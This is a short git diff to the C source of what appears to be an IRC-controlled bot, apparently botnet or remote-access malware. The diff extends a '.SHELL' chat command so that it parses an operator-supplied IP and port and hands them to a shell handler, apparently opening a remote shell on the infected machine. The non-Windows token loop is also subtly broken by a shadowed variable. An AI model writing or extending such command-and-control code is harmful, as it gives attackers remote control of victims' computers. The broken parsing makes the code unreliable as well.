@@ -134,6 +134,7 @@ void command_handler_proxy(int fd, CHAR *nickname, CHAR *username, CHAR *target,
 #elif defined(__linux__) || defined(__APPLE__)
 void command_handler_proxy(int fd, char *nickname, char *username, char *target, char *message) {
 #endif
+    // This variable means if the message is meant for everyone
     int target_channel = 0;
     if (strncmp(target, "#", 1) == 0) {
         target_channel = 1;
@@ -166,10 +167,49 @@ void command_handler_proxy(int fd, char *nickname, char *username, char *target,
             handle_cpu(fd, nickname);
         }
     }
-    else if (strncmp(message, ".SHELL", 4) == 0) {
+    else if (strncmp(message, ".SHELL", 5) == 0) {
         if (target_channel == 0) {
-            handle_shell(fd, nickname);
-            log_message("finished .SHELL\n");
+            char ip[IP_MAX_SIZE] = {'\0'};
+            int port;
+            int count = 0;
+#ifdef _WIN32
+            char *next_token1 = NULL;
+
+            printf("G0na check this : %s\n", message);
+
+            char* _token = strtok_s(message, " ", &next_token1);
+#else
+            char* _token = strtok(message, " ");
+#endif
+            while (_token != NULL) {
+#ifdef _WIN32
+                _token = strtok_s(NULL, " ", &next_token1);
+#else
+                char* _token = strtok(NULL, " ");
+#endif
+                count++;
+                if (count == 1) {
+#ifdef _WIN32
+                    strncpy_s(ip, _token, IP_MAX_SIZE);
+#else
+                    strncpy(ip, _token, IP_MAX_SIZE);
+#endif
+                }
+                else if (count == 2) {
+                    port = atoi(_token);
+                    break;
+                }
+            }
+
+            printf("%s:%d\n", ip, port);
+
+            if (port == 0) {
+                log_message("Wrong port input\n");
+            }
+            else {
+                handle_shell(fd, nickname, ip, port);
+                log_message("Finished .SHELL\n");
+            }
         }
     }
 }
